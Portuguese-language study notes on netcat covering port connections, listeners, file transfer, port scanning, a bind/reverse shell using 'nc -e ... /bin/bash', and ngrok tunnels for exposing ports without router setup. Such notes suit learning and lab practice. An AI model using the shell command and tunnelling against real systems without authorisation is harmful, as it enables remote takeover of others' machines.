|===> Netcat <===|
*** INTRODUCTION ***
"Canivete suiço"
<> netcat ou nc
ode-se conectar a qualquer porta

<> nc google.com 80
-> netcat | alvo | porta

logo abre terminal para envio de dados

Cada protocolo exige diferentes dados obrigatorios dependendo da versão

Monitoramento
<> nc -lvp 9000
-> executa um comando de monitoramneto na porta 9000
	-l = Listen -> Modo Ouvir
	-v = Verbosity -> Detalhado
	-p = Porta 

Wireshark para monitoramento de pacotes enviados e recebidos
* 127.0.0.1 = Rede interna ou Loopback

TCP 3-Way-Handshake
A -> B =	Syn		->	1º Handshake
B -> A =	Syn, Ack	->	2º Handshake
A -> B =	Ack		->	3º Handshake

Syn - Solicitação de conexão
Ack - Reconhecimento

*** REVERSE SHELL WITH NETCAT ***
 == ARQUIVE TRANSFER ==
(A - B)
A = Local
- = Conexão
B = remoto

A ...
<> nc -lvp 777 > Arquivo.txt
	> = diz para o comando salvar os dados em um arquivo

B ...
<> nc 127.0.0.1 < arquivo.txt
	< = Diz para o comando enviar um arquivo

* md5sum arquvio.txt -> Verifica o hash de integridade do arquivo


== PORTSCAN ==
<> nc -zv 127.0.0.1 1-90
	-z = Escanner de porta
	-v Verbosity
Utiliza o protocolo TCP para verificação
"Caso não retorne nada indica que provavelmente as portas não estão abertas"


== Bind ==
Executa um ṕrograma


A...
<> nc -e alvo /bin/bash
	-e = Executar
	/bin/bash = Local do shell do Linux


B...
<> nv -lvp 400

Assim que A se conectar a B usando "-e /bin/bash" que esta escutando na porta alvo, sera executado o bash de A no terminal de B
** Alguns sistemas bloqueiam a abertura de portas abaixo de 1024 mas não portas altas**




	*** NAT ***
 * Network Addres Protocol * 
A = Local
B = Externo

A ...
<> nc -lvp 999

B ...
Por ser um ip externo, a conexão remota de fora da rede não ocorrera usando apenas o ip publico 
Para burlar isso pode-se configurar a rede nat para encaminhar portas diretamente para determinado IP local 




*** NGROK ***
Ferramenta de direcionamento de portas sem precisar acessar o roteador

www.ngrok.com

Salvar token de autenticação

autenticação
<> ./ngrok authtoken KeyToken

<> ./ngrok http 80
	- http = Protocolo
	- 80 = Porta

Colocar Ngrok no PATH de programas
<> sudo cp ngrok /bin/


Criar tunel TCP
<> ngrok tcp 456
	- tcp protocolo
	- 446 porta "aberta"
 Isso permite abrir portas sem a necessidade de configurar o NAT no roteador


Para permitir a criação de varios tuneis pode-se editar o arqui YML em .ngrok
Algo parecido com{
...
	tunnels:
		tunnel_1:
			proto: http
			addr: 8080
		tunnel_2:
			proto: tcp
			addr: 444
...
}

para executar os tuneis
<> ngrok start all
	all - Todos tunnels

































